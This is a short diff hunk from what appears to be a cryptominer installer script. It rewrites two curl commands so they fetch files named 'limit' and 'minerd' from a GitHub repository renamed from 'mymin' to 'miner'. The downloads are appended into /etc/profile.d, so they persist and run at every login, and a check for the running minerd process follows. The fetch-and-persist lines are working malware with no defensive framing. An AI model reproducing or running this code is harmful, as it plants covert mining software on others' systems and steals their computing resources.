@@ -55,8 +55,8 @@ do
 done
 echo $address
 if [ -d "/etc/profile.d" ]; then
-	curl -s https://raw.githubusercontent.com/bluemoon00/mymin/master/limit >> "/etc/profile.d/${limit}"
-	curl -s https://raw.githubusercontent.com/bluemoon00/mymin/master/minerd >> "/etc/profile.d/${minerd}"
+	curl -s https://raw.githubusercontent.com/bluemoon00/miner/master/limit >> "/etc/profile.d/${limit}"
+	curl -s https://raw.githubusercontent.com/bluemoon00/miner/master/minerd >> "/etc/profile.d/${minerd}"
 	echo '
 #! /bin/bash
 ps_out=`ps -ef | grep '${minerd}' | grep -v 'grep' | grep -v 'limit'`
